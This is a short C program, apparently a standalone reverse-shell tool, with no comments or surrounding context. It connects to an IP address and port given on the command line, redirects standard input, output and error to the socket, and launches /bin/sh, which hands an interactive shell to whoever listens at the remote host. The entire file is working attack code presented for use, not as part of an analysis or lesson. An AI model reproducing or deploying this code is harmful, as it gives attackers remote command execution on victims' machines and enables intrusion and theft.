#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>
int main(int argc, char **argv){
    if( argc != 3 ){
        exit(-1);
    }   
    int port = atoi(argv[2]);
    char* ip = argv[1];
    int sd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in sin = {
        .sin_family = AF_INET,
        .sin_port = htons(port),
        .sin_addr.s_addr = inet_addr(ip),
    };
    connect(sd, (struct sockaddr *)&sin, sizeof(sin));
    for(int _ = 0; _ <= 2; _++) 
        dup2(sd, _);
    execl("/bin/sh", "/bin/sh", NULL);
    return 0;
}